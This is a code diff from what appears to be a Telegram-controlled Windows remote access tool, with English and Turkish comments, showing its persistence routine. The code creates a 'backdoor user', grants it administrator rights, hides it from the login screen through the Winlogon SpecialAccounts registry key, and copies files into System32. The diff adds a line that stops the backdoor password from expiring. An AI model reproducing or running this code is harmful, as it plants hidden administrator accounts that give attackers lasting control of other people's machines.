@@ -261,30 +261,23 @@ en_menu=telepot.namedtuple.ReplyKeyboardMarkup(
 def add_startup():
     #print("0")
     if os.name=="nt":
-        #print("a")
         try:
-            #print("1")
             sid=get_sid(username)
-            #print("2")
             globalMessage(sid)
             sp.call(['net', 'user', '/delete', f'{username}'])
             sp.call(['net', 'user', '/add', f'{username}', f'{password}'])  #Add backdoor user. Arka kapı kullanıcısı ekleyelim.
             sp.call(['net', 'localgroup', 'administrators', f'{username}', '/add']) #Grant user to Admin permissions. Admin yetkisi verelim.
+            sp.call(['WMIC', 'USERACCOUNT', 'WHERE', f'Name={username}', 'SET', 'PasswordExpires=FALSE']) #Şifremiz asla zaman aşımına uğramasın Our password should not expire.
             sp.call(['REG', 'ADD', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts', '/f'])#To hide user. Kullanıcıyı gizlemek için regediti editleyelim.
             sp.call(['REG', 'ADD', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList', '/f']) #same
             sp.call(['REG', 'ADD', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList', '/v', f'{username}', '/t', 'REG_DWORD', '/d', '0', '/f']) #Change "/d 0" to "/d 1" if you want account to visible. Hesabın gözükmesini istiyorsanız "/d 0" yu "/d 1" olarak değişin.
-            #print("3")
             chk_file(xml_path)
-            #print("5")
             chk_file(system32+settings_name)
-            #print("6")
             chk_file(system32+softwarename)
-            #print("7")
             #if not os.path.exists(xml_path):
             xmlfile=open(xml_path,"w") #Open file to write. (for read use "r" for write "w") Dosyayı yazmak için açalım. (okumak için "r" yazmak için "w")
             xmlfile.write(str(xml_file))
             xmlfile.close()
-            #print("8")
             #if not os.path.exists(system32+settings_name):
             try:
                 win_copy_file(settings_dir, system32)
